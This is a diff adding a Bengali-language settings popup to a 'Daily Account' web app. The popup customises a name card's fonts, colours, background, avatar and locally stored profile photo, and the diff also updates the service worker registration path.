+        <span id="__nc_flbl" style="font-size:22px;font-weight:900;color:#0062FF;flex:1;text-align:center">19px</span>
+        <button onclick="__ncAF(1)" style="width:36px;height:36px;border-radius:50%;border:1.5px solid rgba(0,100,255,.3);background:rgba(0,100,255,.08);font-size:20px;font-weight:900;cursor:pointer;color:#0062FF">+</button>
+      </div>
+
+      <!-- কার্ড Height -->
+      <div style="font-size:10.5px;font-weight:800;letter-spacing:1px;color:#9ca3af;text-transform:uppercase;margin:13px 0 8px">&#128208; কার্ড Height (padding)</div>
+      <div style="display:flex;align-items:center;gap:12px;background:rgba(0,100,255,.05);border:1.5px solid rgba(0,100,255,.12);border-radius:14px;padding:11px 14px">
+        <button onclick="__ncAP(-2)" style="width:36px;height:36px;border-radius:50%;border:1.5px solid rgba(0,100,255,.3);background:rgba(0,100,255,.08);font-size:20px;font-weight:900;cursor:pointer;color:#0062FF">&#8722;</button>
+        <span id="__nc_plbl" style="font-size:22px;font-weight:900;color:#0062FF;flex:1;text-align:center">14px</span>
+        <button onclick="__ncAP(2)" style="width:36px;height:36px;border-radius:50%;border:1.5px solid rgba(0,100,255,.3);background:rgba(0,100,255,.08);font-size:20px;font-weight:900;cursor:pointer;color:#0062FF">+</button>
+      </div>
+
+      <!-- সময় / নিচের লেখা -->
+      <div style="font-size:10.5px;font-weight:800;letter-spacing:1px;color:#9ca3af;text-transform:uppercase;margin:13px 0 8px">&#8987; সময় ও নিচের লেখার সাইজ + রঙ</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px">
+        <div style="background:rgba(0,100,255,.05);border:1.5px solid rgba(0,100,255,.12);border-radius:12px;padding:10px">
+          <div style="font-size:10px;font-weight:800;color:#6366f1;margin-bottom:6px">&#8987; সময় সাইজ</div>
+          <div style="display:flex;align-items:center;gap:6px">
+            <button onclick="__ncTFS(-1)" style="width:30px;height:30px;border-radius:50%;border:1.5px solid rgba(99,102,241,.3);background:rgba(99,102,241,.08);font-size:16px;font-weight:900;cursor:pointer;color:#6366f1">&#8722;</button>
+            <span id="__nc_tfslbl" style="font-size:15px;font-weight:900;color:#6366f1;flex:1;text-align:center">10px</span>
+            <button onclick="__ncTFS(1)" style="width:30px;height:30px;border-radius:50%;border:1.5px solid rgba(99,102,241,.3);background:rgba(99,102,241,.08);font-size:16px;font-weight:900;cursor:pointer;color:#6366f1">+</button>
+          </div>
+          <div style="margin-top:7px;display:flex;gap:4px;flex-wrap:wrap;align-items:center">
+            <button onclick="__ncTimeC('')" title="ডিফল্ট" style="width:22px;height:22px;border-radius:50%;border:2px solid #0062FF;background:linear-gradient(135deg,#00B4FF,#0062FF);cursor:pointer"></button>
+            <button onclick="__ncTimeC('#ffffff')" style="width:22px;height:22px;border-radius:50%;border:2px solid #ddd;background:#fff;cursor:pointer"></button>
+            <button onclick="__ncTimeC('#fbbf24')" style="width:22px;height:22px;border-radius:50%;border:2px solid #fbbf24;background:#fbbf24;cursor:pointer"></button>
+            <button onclick="__ncTimeC('#10b981')" style="width:22px;height:22px;border-radius:50%;border:2px solid #10b981;background:#10b981;cursor:pointer"></button>
+            <button onclick="__ncTimeC('#f87171')" style="width:22px;height:22px;border-radius:50%;border:2px solid #f87171;background:#f87171;cursor:pointer"></button>
+            <input type="color" id="__nc_tcc" onchange="__ncTimeC(this.value)" style="width:22px;height:22px;border-radius:50%;border:1.5px solid #ddd;cursor:pointer;padding:1px">
+          </div>
+        </div>
+        <div style="background:rgba(99,102,241,.05);border:1.5px solid rgba(99,102,241,.15);border-radius:12px;padding:10px">
+          <div style="font-size:10px;font-weight:800;color:#8b5cf6;margin-bottom:6px">&#128221; নিচের লেখা সাইজ</div>
+          <div style="display:flex;align-items:center;gap:6px">
+            <button onclick="__ncSFS(-1)" style="width:30px;height:30px;border-radius:50%;border:1.5px solid rgba(139,92,246,.3);background:rgba(139,92,246,.08);font-size:16px;font-weight:900;cursor:pointer;color:#8b5cf6">&#8722;</button>
+            <span id="__nc_sfslbl" style="font-size:15px;font-weight:900;color:#8b5cf6;flex:1;text-align:center">11px</span>
+            <button onclick="__ncSFS(1)" style="width:30px;height:30px;border-radius:50%;border:1.5px solid rgba(139,92,246,.3);background:rgba(139,92,246,.08);font-size:16px;font-weight:900;cursor:pointer;color:#8b5cf6">+</button>
+          </div>
+          <div style="margin-top:7px;display:flex;gap:4px;flex-wrap:wrap;align-items:center">
+            <button onclick="__ncSubC('')" title="ডিফল্ট" style="width:22px;height:22px;border-radius:50%;border:2px solid #8b5cf6;background:linear-gradient(135deg,#6366f1,#8b5cf6);cursor:pointer"></button>
+            <button onclick="__ncSubC('#ffffff')" style="width:22px;height:22px;border-radius:50%;border:2px solid #ddd;background:#fff;cursor:pointer"></button>
+            <button onclick="__ncSubC('#a5f3fc')" style="width:22px;height:22px;border-radius:50%;border:2px solid #a5f3fc;background:#a5f3fc;cursor:pointer"></button>
+            <button onclick="__ncSubC('#fcd34d')" style="width:22px;height:22px;border-radius:50%;border:2px solid #fcd34d;background:#fcd34d;cursor:pointer"></button>
+            <button onclick="__ncSubC('#f9a8d4')" style="width:22px;height:22px;border-radius:50%;border:2px solid #f9a8d4;background:#f9a8d4;cursor:pointer"></button>
+            <input type="color" id="__nc_scc" onchange="__ncSubC(this.value)" style="width:22px;height:22px;border-radius:50%;border:1.5px solid #ddd;cursor:pointer;padding:1px">
+          </div>
+        </div>
+      </div>
+
+      <!-- নামের রঙ -->
+      <div style="font-size:10.5px;font-weight:800;letter-spacing:1px;color:#9ca3af;text-transform:uppercase;margin:13px 0 8px">&#128396;&#65039; নামের রঙ</div>
+      <div style="display:flex;gap:7px;flex-wrap:wrap;align-items:center">
+        <button onclick="__ncTC('')" title="ডিফল্ট" style="width:32px;height:32px;border-radius:50%;border:2.5px solid #0062FF;background:linear-gradient(135deg,#0a1628,#061830);cursor:pointer"></button>
+        <button onclick="__ncTC('#ffffff')" style="width:32px;height:32px;border-radius:50%;border:2px solid #ddd;background:#fff;cursor:pointer"></button>
+        <button onclick="__ncTC('#0062FF')" style="width:32px;height:32px;border-radius:50%;border:2px solid #0062FF;background:#0062FF;cursor:pointer"></button>
+        <button onclick="__ncTC('#00B4FF')" style="width:32px;height:32px;border-radius:50%;border:2px solid #00B4FF;background:#00B4FF;cursor:pointer"></button>
+        <button onclick="__ncTC('#10b981')" style="width:32px;height:32px;border-radius:50%;border:2px solid #10b981;background:#10b981;cursor:pointer"></button>
+        <button onclick="__ncTC('#ef4444')" style="width:32px;height:32px;border-radius:50%;border:2px solid #ef4444;background:#ef4444;cursor:pointer"></button>
+        <button onclick="__ncTC('#f59e0b')" style="width:32px;height:32px;border-radius:50%;border:2px solid #f59e0b;background:#f59e0b;cursor:pointer"></button>
+        <button onclick="__ncTC('#8b5cf6')" style="width:32px;height:32px;border-radius:50%;border:2px solid #8b5cf6;background:#8b5cf6;cursor:pointer"></button>
+        <button onclick="__ncTC('#ec4899')" style="width:32px;height:32px;border-radius:50%;border:2px solid #ec4899;background:#ec4899;cursor:pointer"></button>
+        <button onclick="__ncTC('#cce4ff')" style="width:32px;height:32px;border-radius:50%;border:2px solid #cce4ff;background:#cce4ff;cursor:pointer"></button>
+        <input type="color" id="__nc_cc" onchange="__ncTC(this.value)" title="কাস্টম" style="width:32px;height:32px;border-radius:50%;border:2px solid #ddd;cursor:pointer;padding:1px">
+      </div>
+
+      <!-- ব্যাকগ্রাউন্ড প্রিসেট -->
+      <div style="font-size:10.5px;font-weight:800;letter-spacing:1px;color:#9ca3af;text-transform:uppercase;margin:13px 0 8px">&#128444;&#65039; ব্যাকগ্রাউন্ড প্রিসেট</div>
+      <div style="display:flex;gap:7px;flex-wrap:wrap;margin-bottom:8px">
+        <button onclick="__ncBG('default')" title="ডিফল্ট" style="width:38px;height:38px;border-radius:10px;border:2px solid rgba(0,100,255,.3);background:linear-gradient(135deg,rgba(0,80,200,.3),rgba(0,40,130,.2));cursor:pointer"></button>
+        <button onclick="__ncBG('dark')" title="গাঢ় নীল" style="width:38px;height:38px;border-radius:10px;border:2px solid #334;background:linear-gradient(135deg,#0a0e2a,#1a2050);cursor:pointer"></button>
+        <button onclick="__ncBG('black')" title="কালো" style="width:38px;height:38px;border-radius:10px;border:2px solid #444;background:#111;cursor:pointer"></button>
+        <button onclick="__ncBG('green')" title="সবুজ" style="width:38px;height:38px;border-radius:10px;border:2px solid #10b981;background:linear-gradient(135deg,#065f46,#10b981);cursor:pointer"></button>
+        <button onclick="__ncBG('purple')" title="বেগুনী" style="width:38px;height:38px;border-radius:10px;border:2px solid #8b5cf6;background:linear-gradient(135deg,#4c1d95,#8b5cf6);cursor:pointer"></button>
+        <button onclick="__ncBG('pink')" title="গোলাপী" style="width:38px;height:38px;border-radius:10px;border:2px solid #ec4899;background:linear-gradient(135deg,#9d174d,#ec4899);cursor:pointer"></button>
+        <button onclick="__ncBG('red')" title="লাল" style="width:38px;height:38px;border-radius:10px;border:2px solid #ef4444;background:linear-gradient(135deg,#7f1d1d,#ef4444);cursor:pointer"></button>
+        <button onclick="__ncBG('gold')" title="গোল্ড" style="width:38px;height:38px;border-radius:10px;border:2px solid #f59e0b;background:linear-gradient(135deg,#78350f,#f59e0b);cursor:pointer"></button>
+        <button onclick="__ncBG('glass')" title="গ্লাস" style="width:38px;height:38px;border-radius:10px;border:2px solid rgba(255,255,255,.3);background:rgba(255,255,255,0.15);cursor:pointer"></button>
+        <button onclick="__ncBG('white')" title="সাদা" style="width:38px;height:38px;border-radius:10px;border:2px solid #ddd;background:linear-gradient(135deg,#f0f4ff,#e0eaff);cursor:pointer"></button>
+      </div>
+      <!-- কাস্টম BG কালার কোড -->
+      <div style="display:flex;gap:7px;align-items:center;background:rgba(236,72,153,.05);border:1.5px solid rgba(236,72,153,.18);border-radius:12px;padding:9px 11px">
+        <span style="font-size:11px;font-weight:800;color:#ec4899;white-space:nowrap">&#127912; কালার কোড:</span>
+        <input type="text" id="__nc_cbc" placeholder="#ff0000 বা rgba(0,100,255,.5)" style="flex:1;background:rgba(255,255,255,.07);border:1.5px solid rgba(236,72,153,.25);border-radius:8px;padding:7px 10px;font-size:12px;font-weight:700;color:inherit;outline:none;font-family:monospace">
+        <button onclick="__ncCustomBG()" style="padding:7px 12px;background:linear-gradient(135deg,#ec4899,#8b5cf6);color:#fff;border:none;border-radius:8px;font-size:12px;font-weight:800;cursor:pointer">&#10003;</button>
+        <button onclick="__ncClearBG()" style="padding:7px 10px;background:rgba(239,68,68,.1);color:#ef4444;border:1.5px solid rgba(239,68,68,.2);border-radius:8px;font-size:12px;font-weight:800;cursor:pointer">&#10005;</button>
+      </div>
+
+      <!-- প্রোফাইল ফটো -->
+      <div style="font-size:10.5px;font-weight:800;letter-spacing:1px;color:#9ca3af;text-transform:uppercase;margin:13px 0 8px">&#128247; প্রোফাইল ফটো (LocalStorage)</div>
+      <div style="display:flex;gap:10px;align-items:center;background:rgba(16,185,129,.05);border:1.5px solid rgba(16,185,129,.18);border-radius:14px;padding:12px">
+        <div id="__nc_photo_prev" style="width:56px;height:56px;border-radius:50%;background:rgba(0,180,255,.1);border:2px solid rgba(0,180,255,.25);display:flex;align-items:center;justify-content:center;font-size:26px;flex-shrink:0;overflow:hidden">&#128100;</div>
+        <div style="flex:1;display:flex;flex-direction:column;gap:7px">
+          <input type="file" id="__nc_photo_inp" accept="image/*" style="display:none" onchange="__ncPhotoLoad(event)">
+          <button onclick="document.getElementById('__nc_photo_inp').click()" style="padding:9px 14px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;border-radius:10px;font-size:12px;font-weight:800;cursor:pointer;font-family:inherit">&#128247; ফটো বেছে নিন</button>
+          <button onclick="__ncPhotoClear()" style="padding:8px 14px;background:rgba(239,68,68,.08);color:#ef4444;border:1.5px solid rgba(239,68,68,.2);border-radius:10px;font-size:12px;font-weight:800;cursor:pointer;font-family:inherit">&#128465;&#65039; ফটো সরান</button>
+        </div>
+      </div>
+
+      <!-- আইকন শেপ ও সাইজ -->
+      <div style="font-size:10.5px;font-weight:800;letter-spacing:1px;color:#9ca3af;text-transform:uppercase;margin:13px 0 8px">&#128311; আইকন শেপ ও সাইজ</div>
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:8px">
+        <button id="__nc_shape_circle" onclick="__ncShape('circle')" style="padding:10px;border-radius:12px;border:2px solid #0062FF;background:rgba(0,100,255,.1);font-size:13px;font-weight:800;cursor:pointer;color:#0062FF">&#9679; গোল</button>
+        <button id="__nc_shape_square" onclick="__ncShape('square')" style="padding:10px;border-radius:12px;border:2px solid rgba(0,100,255,.2);background:transparent;font-size:13px;font-weight:800;cursor:pointer;color:#6b7280">&#9632; বর্গ</button>
+      </div>
+      <div style="display:flex;align-items:center;gap:12px;background:rgba(0,100,255,.05);border:1.5px solid rgba(0,100,255,.12);border-radius:12px;padding:10px 14px">
+        <button onclick="__ncAS(-4)" style="width:32px;height:32px;border-radius:50%;border:1.5px solid rgba(0,100,255,.3);background:rgba(0,100,255,.08);font-size:18px;font-weight:900;cursor:pointer;color:#0062FF">&#8722;</button>
+        <span id="__nc_aslbl" style="font-size:18px;font-weight:900;color:#0062FF;flex:1;text-align:center">48px</span>
+        <button onclick="__ncAS(4)" style="width:32px;height:32px;border-radius:50%;border:1.5px solid rgba(0,100,255,.3);background:rgba(0,100,255,.08);font-size:18px;font-weight:900;cursor:pointer;color:#0062FF">+</button>
+      </div>
+
+      <!-- Save/Reset -->
+      <div style="display:flex;gap:8px;margin-top:18px">
+        <button onclick="__ncSave()" style="flex:1;padding:14px;background:linear-gradient(135deg,#0062FF,#8800FF,#00B4FF);color:#fff;border:none;border-radius:14px;font-size:14px;font-weight:900;cursor:pointer;font-family:inherit">&#128190; সেভ করুন</button>
+        <button onclick="__ncReset()" style="padding:14px 18px;background:rgba(239,68,68,.1);color:#ef4444;border:1.5px solid rgba(239,68,68,.25);border-radius:14px;font-size:13px;font-weight:800;cursor:pointer;font-family:inherit">&#8635; রিসেট</button>
+      </div>
+    </div>
+  </div>
+</div>
+
 <script>
-if("serviceWorker" in navigator){
-  navigator.serviceWorker.register("../sw.js")
-    .catch(e => console.log("SW:", e));
-}
+(function(){
+  var CK='_da_nc_customize';
+  var DEF={showGreeting:true,showSub:true,showAvatar:true,showTopbar:true,showDatetime:false,
+           showAnimation:true,showEditBtn:true,fontSize:19,padding:14,textColor:'',bgVariant:'default',position:'top',
+           customBgColor:'',avatarShape:'circle',avatarSize:48,subFontSize:11,timeFontSize:10,timeColor:'',subColor:''};
+  var _C={};
+  var _BG={
+    'default':'linear-gradient(135deg,rgba(0,80,200,.14),rgba(0,40,130,.09))',
+    'dark':'linear-gradient(135deg,rgba(0,40,110,.85),rgba(0,15,50,.8))',
+    'black':'linear-gradient(135deg,#111,#222)',
+    'green':'linear-gradient(135deg,#065f46,#10b981)',
+    'purple':'linear-gradient(135deg,#4c1d95,#8b5cf6)',
+    'pink':'linear-gradient(135deg,#9d174d,#ec4899)',
+    'red':'linear-gradient(135deg,#7f1d1d,#ef4444)',
+    'gold':'linear-gradient(135deg,#78350f,#f59e0b)',
+    'glass':'rgba(255,255,255,0.12)',
+    'white':'linear-gradient(135deg,#f0f4ff,#e0eaff)'
+  };
+  function gC(){try{return JSON.parse(localStorage.getItem(CK)||'{}');}catch(e){return{};}}
+  function sC(o){localStorage.setItem(CK,JSON.stringify(o));}
+  function gG(){var h=new Date().getHours();if(h>=5&&h<12)return{t:'\u09b8\u09c1\u09aa\u09cd\u09b0\u09ad\u09be\u09a4',e:'\u2600\ufe0f'};if(h>=12&&h<17)return{t:'\u09b6\u09c1\u09ad \u09a6\u09c1\u09aa\u09c1\u09b0',e:'\ud83c\udf24'};if(h>=17&&h<20)return{t:'\u09b6\u09c1\u09ad \u09ac\u09bf\u0995\u09c7\u09b2',e:'\ud83c\uddc7'};return{t:'\u09b6\u09c1\u09ad \u09b0\u09be\u09a4\u09cd\u09b0\u09bf',e:'\ud83c\udf19'};}
+  function gDT(){var n=new Date(),d=['\u09b0\u09ac\u09bf','\u09b8\u09cb\u09ae','\u09ae\u0999\u09cd\u0997\u09b2','\u09ac\u09c1\u09a7','\u09ac\u09c3\u09b9','\u09b6\u09c1\u0995\u09cd\u09b0','\u09b6\u09a8\u09bf'],m=['\u099c\u09be\u09a8\u09c1','\u09ab\u09c7\u09ac\u09cd\u09b0\u09c1','\u09ae\u09be\u09b0\u09cd\u099a','\u098f\u09aa\u09cd\u09b0\u09bf\u09b2','\u09ae\u09c7','\u099c\u09c1\u09a8','\u099c\u09c1\u09b2\u09be\u0987','\u0986\u0997\u09b8\u09cd\u099f','\u09b8\u09c7\u09aa\u09cd\u099f\u09c7','\u0985\u0995\u09cd\u099f\u09cb','\u09a8\u09ad\u09c7','\u09a1\u09bf\u09b8\u09c7'];var h=n.getHours(),mi=n.getMinutes(),ap=h>=12?'PM':'AM';h=h%12||12;return d[n.getDay()]+', '+n.getDate()+' '+m[n.getMonth()]+' \u2022 '+h+':'+(mi<10?'0':'')+mi+' '+ap;}
+
+  function loadUI(){
+    _C=Object.assign({},DEF,gC());
+    function cb(id,k){var e=document.getElementById(id);if(e)e.checked=!!_C[k];}
+    cb('__nc_sg','showGreeting');cb('__nc_ss','showSub');cb('__nc_sa','showAvatar');
+    cb('__nc_st','showTopbar');cb('__nc_sd','showDatetime');cb('__nc_san','showAnimation');cb('__nc_seb','showEditBtn');
+    var e;
+    e=document.getElementById('__nc_flbl');if(e)e.textContent=(_C.fontSize||19)+'px';
+    e=document.getElementById('__nc_plbl');if(e)e.textContent=(_C.padding||14)+'px';
+    e=document.getElementById('__nc_tfslbl');if(e)e.textContent=(_C.timeFontSize||10)+'px';
+    e=document.getElementById('__nc_sfslbl');if(e)e.textContent=(_C.subFontSize||11)+'px';
+    e=document.getElementById('__nc_aslbl');if(e)e.textContent=(_C.avatarSize||48)+'px';
+    e=document.getElementById('__nc_cbc');if(e)e.value=_C.customBgColor||'';
+    // shape buttons
+    __ncShapeUI(_C.avatarShape||'circle');
+    __ncPosUI(_C.position||'top');
+    // photo preview
+    __ncPhotoPreview(localStorage.getItem('_da_profile_photo')||'');
+    __ncPv();
+  }
+
+  function __ncPosUI(pos){
+    var bt=document.getElementById('__nc_pos_top'),bb=document.getElementById('__nc_pos_bottom');if(!bt||!bb)return;
+    if(pos==='top'){bt.style.cssText='flex:1;padding:10px 6px;border-radius:12px;border:2px solid #0062FF;background:rgba(0,100,255,.12);font-size:12px;font-weight:800;cursor:pointer;color:#0062FF';bb.style.cssText='flex:1;padding:10px 6px;border-radius:12px;border:2px solid rgba(0,100,255,.1);background:transparent;font-size:12px;font-weight:800;cursor:pointer;color:#6b7280';}
+    else{bt.style.cssText='flex:1;padding:10px 6px;border-radius:12px;border:2px solid rgba(0,100,255,.1);background:transparent;font-size:12px;font-weight:800;cursor:pointer;color:#6b7280';bb.style.cssText='flex:1;padding:10px 6px;border-radius:12px;border:2px solid #0062FF;background:rgba(0,100,255,.12);font-size:12px;font-weight:800;cursor:pointer;color:#0062FF';}
+  }
+  function __ncShapeUI(shape){
+    var bc=document.getElementById('__nc_shape_circle'),bs=document.getElementById('__nc_shape_square');if(!bc||!bs)return;
+    if(shape==='circle'){bc.style.cssText='padding:10px;border-radius:12px;border:2px solid #0062FF;background:rgba(0,100,255,.1);font-size:13px;font-weight:800;cursor:pointer;color:#0062FF';bs.style.cssText='padding:10px;border-radius:12px;border:2px solid rgba(0,100,255,.2);background:transparent;font-size:13px;font-weight:800;cursor:pointer;color:#6b7280';}
+    else{bc.style.cssText='padding:10px;border-radius:12px;border:2px solid rgba(0,100,255,.2);background:transparent;font-size:13px;font-weight:800;cursor:pointer;color:#6b7280';bs.style.cssText='padding:10px;border-radius:12px;border:2px solid #0062FF;background:rgba(0,100,255,.1);font-size:13px;font-weight:800;cursor:pointer;color:#0062FF';}
+  }
+  function __ncPhotoPreview(src){
+    var el=document.getElementById('__nc_photo_prev');if(!el)return;
+    el.innerHTML=src?'<img src="'+src+'" style="width:100%;height:100%;object-fit:cover;border-radius:50%">':'\ud83d\udc64';
+  }
+
+  window.__openNcPopup=function(){loadUI();document.getElementById('__ncPopupBg').style.display='block';document.body.style.overflow='hidden';};
+  window.__closeNcPopup=function(){document.getElementById('__ncPopupBg').style.display='none';document.body.style.overflow='';};
+  window.__ncAF=function(d){_C.fontSize=Math.max(12,Math.min(40,(_C.fontSize||19)+d));var e=document.getElementById('__nc_flbl');if(e)e.textContent=_C.fontSize+'px';__ncPv();};
+  window.__ncAP=function(d){_C.padding=Math.max(0,Math.min(32,(_C.padding||14)+d));var e=document.getElementById('__nc_plbl');if(e)e.textContent=_C.padding+'px';__ncPv();};
+  window.__ncTC=function(c){_C.textColor=c;__ncPv();};
+  window.__ncBG=function(v){_C.bgVariant=v;_C.customBgColor='';var e=document.getElementById('__nc_cbc');if(e)e.value='';__ncPv();};
+  window.__ncPos=function(p){_C.position=p;__ncPosUI(p);__ncPv();};
+  window.__ncShape=function(s){_C.avatarShape=s;__ncShapeUI(s);__ncPv();};
+  window.__ncAS=function(d){_C.avatarSize=Math.max(28,Math.min(80,(_C.avatarSize||48)+d));var e=document.getElementById('__nc_aslbl');if(e)e.textContent=_C.avatarSize+'px';__ncPv();};
+  window.__ncTFS=function(d){_C.timeFontSize=Math.max(8,Math.min(18,(_C.timeFontSize||10)+d));var e=document.getElementById('__nc_tfslbl');if(e)e.textContent=_C.timeFontSize+'px';__ncPv();};
+  window.__ncSFS=function(d){_C.subFontSize=Math.max(8,Math.min(18,(_C.subFontSize||11)+d));var e=document.getElementById('__nc_sfslbl');if(e)e.textContent=_C.subFontSize+'px';__ncPv();};
+  window.__ncTimeC=function(c){_C.timeColor=c;__ncPv();};
+  window.__ncSubC=function(c){_C.subColor=c;__ncPv();};
+  window.__ncCustomBG=function(){var e=document.getElementById('__nc_cbc');if(e&&e.value.trim()){_C.customBgColor=e.value.trim();_C.bgVariant='';__ncPv();}};
+  window.__ncClearBG=function(){_C.customBgColor='';_C.bgVariant='default';var e=document.getElementById('__nc_cbc');if(e)e.value='';__ncPv();};
+  window.__ncPhotoLoad=function(ev){
+    var file=ev.target.files&&ev.target.files[0];if(!file)return;
+    var r=new FileReader();
+    r.onload=function(e){
+      var data=e.target.result;
+      localStorage.setItem('_da_profile_photo',data);
+      __ncPhotoPreview(data);
+      __ncPv();
+      if(typeof showToast==='function')showToast('\ud83d\udcf8 \u09ab\u09a4\u09cb \u09b8\u09c7\u09ad \u09b9\u09af\u09bc\u09c7\u099b\u09c7');
+    };
+    r.readAsDataURL(file);
+  };
+  window.__ncPhotoClear=function(){
+    localStorage.removeItem('_da_profile_photo');
+    __ncPhotoPreview('');
+    __ncPv();
+    if(typeof showToast==='function')showToast('\ud83d\uddd1\ufe0f \u09ab\u09a4\u09cb \u09b8\u09b0\u09be\u09a8\u09cb \u09b9\u09af\u09bc\u09c7\u099b\u09c7');
+  };
+
+  window.__ncPv=function(){
+    function cv(id,k){var e=document.getElementById(id);if(e)_C[k]=e.checked;}
+    cv('__nc_sg','showGreeting');cv('__nc_ss','showSub');cv('__nc_sa','showAvatar');
+    cv('__nc_st','showTopbar');cv('__nc_sd','showDatetime');cv('__nc_san','showAnimation');cv('__nc_seb','showEditBtn');
+    var pv=document.getElementById('__nc_pv');if(!pv)return;
+    var g=gG(),name=localStorage.getItem('_da_user_name')||'\u0986\u09aa\u09a8\u09be\u09b0 \u09a8\u09be\u09ae';
+    var bg=_C.customBgColor?_C.customBgColor:(_BG[_C.bgVariant||'default']||_BG['default']);
+    var nc=_C.textColor||'#0a1628',gc='rgba(0,130,255,.8)',sc='rgba(0,50,130,.5)';
+    var tc2=_C.timeColor||gc,sc2=_C.subColor||sc;
+    var anim=_C.showAnimation?'animation:ncSlideIn .45s;':'';
+    var tb=_C.showTopbar?'<div style="position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,#00B4FF,#0062FF,#8800FF,#00E5FF);"></div>':'';
+    var avSz=_C.avatarSize||48,isSquare=_C.avatarShape==='square';
+    var avBr=isSquare?'border-radius:'+Math.round(avSz*0.22)+'px':'border-radius:50%';
+    var photo=localStorage.getItem('_da_profile_photo')||'';
+    var avInn=photo?'<img src="'+photo+'" style="width:calc(100% - 4px);height:calc(100% - 4px);'+avBr+';object-fit:cover;display:block;">':'<div style="width:calc(100% - 4px);height:calc(100% - 4px);'+avBr+';display:flex;align-items:center;justify-content:center;font-size:'+Math.round(avSz*0.46)+'px;background:#081322;">'+g.e+'</div>';
+    var av=_C.showAvatar?'<div style="width:'+avSz+'px;height:'+avSz+'px;'+avBr+';display:flex;align-items:center;justify-content:center;flex-shrink:0;background:conic-gradient(from 0deg,#00B4FF,#0062FF,#8800FF,#00E5FF);overflow:hidden;">'+avInn+'</div>':'';
+    var gh=_C.showGreeting?'<div style="font-size:10.5px;font-weight:700;letter-spacing:.8px;text-transform:uppercase;margin-bottom:2px;color:'+gc+'">'+g.t+'! \ud83d\udc4b</div>':'';
+    var sh=_C.showSub?'<div style="font-size:'+(_C.subFontSize||11)+'px;margin-top:2px;font-weight:600;opacity:.85;color:'+sc2+'">Daily Account \u2022 \u0986\u09aa\u09a8\u09be\u09b0 \u09b9\u09bf\u09b8\u09be\u09ac</div>':'';
+    var dh=_C.showDatetime?'<div style="font-size:'+(_C.timeFontSize||10)+'px;font-weight:700;color:'+tc2+';margin-top:2px">\ud83d\udcc5 '+gDT()+'</div>':'';
+    var eb=_C.showEditBtn?'<div style="display:flex;flex-direction:column;gap:5px;flex-shrink:0"><div style="width:36px;height:36px;border-radius:11px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);display:flex;align-items:center;justify-content:center">\u270f\ufe0f</div><div style="width:36px;height:36px;border-radius:11px;background:rgba(255,255,255,.08);border:1px solid rgba(255,255,255,.15);display:flex;align-items:center;justify-content:center;font-size:13px">\u2699\ufe0f</div></div>':'';
+    pv.innerHTML='<div style="border-radius:14px;overflow:hidden;position:relative;background:'+bg+';'+anim+'">'+tb+
+      '<div style="display:flex;align-items:center;gap:12px;padding:'+_C.padding+'px 14px;position:relative;z-index:1">'+
+        av+'<div style="flex:1;min-width:0">'+gh+
+        '<div style="font-size:'+_C.fontSize+'px;font-weight:900;line-height:1.2;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;color:'+nc+'">'+name+'</div>'+
+        dh+sh+'</div>'+eb+
+      '</div></div>';
+  };
+
+  window.__ncSave=function(){
+    function cv(id,k){var e=document.getElementById(id);if(e)_C[k]=e.checked;}
+    cv('__nc_sg','showGreeting');cv('__nc_ss','showSub');cv('__nc_sa','showAvatar');
+    cv('__nc_st','showTopbar');cv('__nc_sd','showDatetime');cv('__nc_san','showAnimation');cv('__nc_seb','showEditBtn');
+    var cbc=document.getElementById('__nc_cbc');if(cbc&&cbc.value.trim())_C.customBgColor=cbc.value.trim();
+    sC(_C);
+    if(typeof window.DA_ncRender==='function') window.DA_ncRender();
+    __closeNcPopup();
+    if(typeof showToast==='function')showToast('\u2705 \u09a8\u09be\u09ae \u0995\u09be\u09b0\u09cd\u09a1 \u09b8\u09c7\u09ad \u09b9\u09af\u09bc\u09c7\u099b\u09c7');
+  };
+  window.__ncReset=function(){_C=Object.assign({},DEF);sC(_C);loadUI();if(typeof showToast==='function')showToast('\u21ba \u09a1\u09bf\u09ab\u09b2\u09cd\u099f\u09c7 \u09ab\u09bf\u09b0\u09c7 \u0997\u09c7\u099b\u09c7');};
+})();
+</script>
+
+<script>
+var _ly=0;
+document.addEventListener("touchmove",function(e){
+  var st=document.documentElement.scrollTop||document.body.scrollTop;
+  if(st===0&&e.touches[0].clientY>_ly)e.preventDefault();
+  _ly=e.touches[0].clientY;
+},{passive:false});
+document.addEventListener("contextmenu",function(e){e.preventDefault();});
+if("serviceWorker"in navigator){navigator.serviceWorker.register("/myapp_project/sw.js").catch(function(){});}
 </script>
 </body>
 </html>
